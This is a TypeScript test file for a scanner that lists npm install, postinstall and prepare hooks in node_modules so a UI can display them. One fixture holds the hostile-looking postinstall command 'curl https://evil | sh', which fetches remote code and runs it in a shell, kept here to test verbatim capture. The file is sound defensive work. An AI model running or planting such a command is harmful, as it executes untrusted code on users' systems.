import fs from 'fs';
import os from 'os';
import path from 'path';
import {afterEach, beforeEach, describe, expect, it} from 'vitest';
import {LifecycleScriptScanner} from '../backend/Upgrade/LifecycleScriptScanner.js';

function writePkg(dir: string, pkg: object): void {
    fs.mkdirSync(dir, {recursive: true});
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(pkg));
}

describe('LifecycleScriptScanner.scan', () => {
    let tmp: string;

    beforeEach(() => {
        tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'nppm-lifecycle-'));
    });

    afterEach(() => {
        fs.rmSync(tmp, {recursive: true, force: true});
    });

    it('returns [] when node_modules is absent', () => {
        const s = new LifecycleScriptScanner(tmp);
        expect(s.scan()).toEqual([]);
    });

    it('lists install / postinstall / prepare hooks across top-level packages', () => {
        writePkg(path.join(tmp, 'node_modules', 'foo'), {
            name: 'foo',
            version: '1.0.0',
            scripts: {install: 'node-gyp rebuild', postinstall: 'echo hi'}
        });
        writePkg(path.join(tmp, 'node_modules', 'bar'), {
            name: 'bar',
            version: '2.0.0',
            scripts: {prepare: 'do-prepare', test: 'should be ignored'}
        });
        writePkg(path.join(tmp, 'node_modules', 'baz'), {
            name: 'baz',
            version: '3.0.0',
            scripts: {build: 'should be ignored'}
        });

        const scripts = new LifecycleScriptScanner(tmp).scan();
        const keys = scripts.map((s) => `${s.name}:${s.hook}`).sort();
        expect(keys).toEqual(['bar:prepare', 'foo:install', 'foo:postinstall']);
    });

    it('handles @scope/* packages by descending one level', () => {
        writePkg(path.join(tmp, 'node_modules', '@scope', 'lib'), {
            name: '@scope/lib',
            version: '1.0.0',
            scripts: {install: 'node-gyp rebuild'}
        });
        const scripts = new LifecycleScriptScanner(tmp).scan();
        expect(scripts).toHaveLength(1);
        expect(scripts[0].name).toBe('@scope/lib');
        expect(scripts[0].hook).toBe('install');
    });

    it('skips .bin and other hidden node_modules entries', () => {
        fs.mkdirSync(path.join(tmp, 'node_modules', '.bin'), {recursive: true});
        const scripts = new LifecycleScriptScanner(tmp).scan();
        expect(scripts).toEqual([]);
    });

    it('tolerates a malformed package.json by skipping it', () => {
        const dir = path.join(tmp, 'node_modules', 'broken');
        fs.mkdirSync(dir, {recursive: true});
        fs.writeFileSync(path.join(dir, 'package.json'), '{ not json');
        const scripts = new LifecycleScriptScanner(tmp).scan();
        expect(scripts).toEqual([]);
    });

    it('captures the script body verbatim so the UI can show it', () => {
        writePkg(path.join(tmp, 'node_modules', 'foo'), {
            name: 'foo',
            version: '1.0.0',
            scripts: {postinstall: 'curl https://evil | sh'}
        });
        const scripts = new LifecycleScriptScanner(tmp).scan();
        expect(scripts[0].script).toBe('curl https://evil | sh');
    });
});